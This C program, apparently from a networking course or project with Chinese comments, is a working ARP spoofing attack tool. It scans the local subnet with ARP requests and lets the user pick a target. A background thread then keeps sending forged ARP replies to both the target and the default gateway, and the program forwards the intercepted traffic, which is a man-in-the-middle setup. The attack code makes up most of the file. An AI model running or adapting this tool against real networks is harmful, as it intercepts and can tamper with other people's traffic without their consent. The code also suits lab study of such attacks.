#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#include "arp.h"
#include "dns.h"
#include "icmp.h"
#include "netdevice.h"
#include "tcp.h"
#include "util.h"

extern char *defdnsquery;
extern uint16_t tcp_filter_port;
extern uint8_t *myroutereth;
extern uint8_t *targetip;
extern uint8_t *targeteth;
extern uint8_t start_attack;

void print_payload(const uint8_t *data, int len) {
  int i;

  for (i = 0; (i < len && i < MAX_DUMP_LEN); i++) {
    printf("%c", data[i]);
    if (((i + 1) % MAX_LINE_LEN) == 0) printf("\n");
  }
  if ((i % MAX_LINE_LEN) != 0) printf("\n");
  printf("\n");
}

void rcvd_raw_tcp(myip_hdr_t *ip_hdr, mytcp_hdr_t *tcp_hdr, uint8_t *data,
                  int len) {
  if (swap16(tcp_hdr->dstport) != tcp_filter_port) return;
  if (tcp_hdr->flags & TCP_FG_SYN && tcp_hdr->flags & TCP_FG_ACK) {
    printf("Received SYN-ACK from %s:%d\n", ip_addrstr(ip_hdr->srcip, NULL),
           swap16(tcp_hdr->srcport));
  }
  if (tcp_hdr->flags & TCP_FG_RST) {
    printf("Received RST from %s:%d\n", ip_addrstr(ip_hdr->srcip, NULL),
           swap16(tcp_hdr->srcport));
  }
  print_payload((uint8_t *)data, len);
}

void *start_spoofing(netdevice_t *p) {
  while (start_attack) {
    // 騙目標主機
    arp_spoof(p, targeteth, targetip, myrouterip);
    // 騙預設閘道器
    arp_spoof(p, myroutereth, myrouterip, targetip);
    sleep(3);
  }
  pthread_exit(NULL);
}

/**
 * main_proc() - the main thread
 **/
int main_proc3(netdevice_t *p) {
  char buf[MAX_LINEBUF];
  ipaddr_t ip;
  int key;

  ipethaddr_t *target;

  // 利用 ARP request 掃描子網
  arp_scan(p);

  while (1) {
    /*
     * Proccess packets in the capture buffer
     */
    if (netdevice_rx(p) == -1) {
      break;
    }

    /*
     * If key is not pressed, continue to next loop
     */
    if (!readready()) {
      continue;
    }
    /*
     * If user pressed enter, exit the program
     */
    if ((key = fgetc(stdin)) == '\n') {
      break;
    }
    ungetc(key, stdin);

    if (key == 'a') {
      target = arptable_select();
      targetip = &(target->ip);
      targeteth = target->eth;
      myroutereth = arptable_existed(defarpip);
      start_attack = 0x01;
      break;
    }

    if (fgets(buf, MAX_LINEBUF, stdin) == NULL) {
      break;
    }
  }

  pthread_t t;
  pthread_create(&t, NULL, start_spoofing, p);

  while (1) {
    /*
     * Proccess packets in the capture buffer
     */
    if (netdevice_rx_transfer(p) == -1) {
      break;
    }

    /*
     * If key is not pressed, continue to next loop
     */
    if (!readready()) {
      continue;
    }
    /*
     * If user pressed enter, exit the program
     */
    if ((key = fgetc(stdin)) == '\n') {
      start_attack = 0x00;
      break;
    }
    ungetc(key, stdin);

    if (fgets(buf, MAX_LINEBUF, stdin) == NULL) {
      break;
    }
  }
  pthread_join(t, NULL);
}

void arp_scan(netdevice_t *p) {
  // 計算 netmask 長度
  int mask_len = 0;
  for (int i = 0; mynetmask[i] != 0; i++) {
    uint8_t mask_1 = 0x80;
    for (int j = 0; j < 8; j++) {
      if ((mynetmask[i] & (mask_1 >> j)) == 0) {
        break;
      }
      mask_len++;
    }
  }
  
  uint8_t target_ip[IPV4_ADDR_LEN];
  for (int i = 0; i < IPV4_ADDR_LEN; i++) {
    target_ip[i] = myipaddr[i] & mynetmask[i];
    // printf("%d ", target_ip[i]);
  }

  int host_num = (1 << (32-mask_len)) - 2;
  for (int i = 1; i <= host_num; i++) {

    if (target_ip[3]++ == 0xff) {
      if (target_ip[2]++ == 0xff) {
        if (target_ip[1]++ == 0xff) {
          target_ip[0]++;
        }
      }
    }
    
    arp_request(p, (uint8_t *)&target_ip);
  }
}

void arp_spoof(netdevice_t *p, uint8_t *dsteth, uint8_t *dstip, uint8_t *srcip) {
  eth_hdr_t eth_hdr;
  myarp_t pkt;

  COPY_ETH_ADDR(eth_hdr.eth_dst, dsteth);
  COPY_ETH_ADDR(eth_hdr.eth_src, myethaddr);
  eth_hdr.eth_type = ETH_ARP;

  pkt.ethtype = ARP_ETH_TYPE;
  pkt.iptype = ETH_IP;
  pkt.ethlen = ETH_ADDR_LEN;
  pkt.iplen = IPV4_ADDR_LEN;
  pkt.op = ARP_OP_REPLY;
  COPY_ETH_ADDR(pkt.srceth, myethaddr);
  COPY_IPV4_ADDR(pkt.srcip, srcip);
  COPY_ETH_ADDR(pkt.dsteth, dsteth);
  COPY_IPV4_ADDR(pkt.dstip, dstip);

#if (DEBUG_ARP_REPLY == 1)
  printf("arp_reply() to %s\n", ip_addrstr(dstip, NULL));
#endif /* DEBUG_ARP_REPLY */

  if (netdevice_xmit(p, eth_hdr, (uint8_t *)&pkt, sizeof(pkt)) != 0) {
    fprintf(stderr, "Failed to send ARP reply.\n");
  }
}

/****
 ****	MAIN ENTRY
 ****/

int main(int argc, char *argv[]) {
  char devname[MAX_LINEBUF], errbuf[PCAP_ERRBUF_SIZE];
  netdevice_t *p;

  /*
   * Get the device name of capture interface
   */
  if (argc == 2) {
    strcpy(devname, argv[1]);
  } else if (netdevice_getdevice(0, devname) == NETDEVICE_ERR) {
    return -1;
  }

  /*
   * Open the specified interface
   */
  if ((p = netdevice_open(devname, errbuf)) == NULL) {
    fprintf(stderr, "Failed to open capture interface\n\t%s\n", errbuf);
    return -1;
  }
  printf("Capturing packets on interface %s\n", devname);

  /*
   * Register the packet handler callback of specific protocol
   */
  netdevice_add_proto(p, ETH_ARP, (ptype_handler)&arp_main);
  netdevice_add_proto(p, ETH_IP, (ptype_handler)&ip_main_transfer);
  tcp_set_raw_handler((tcp_raw_handler)&rcvd_raw_tcp);

  main_proc3(p);

  /*
   * Clean up the resources
   */
  netdevice_close(p);
}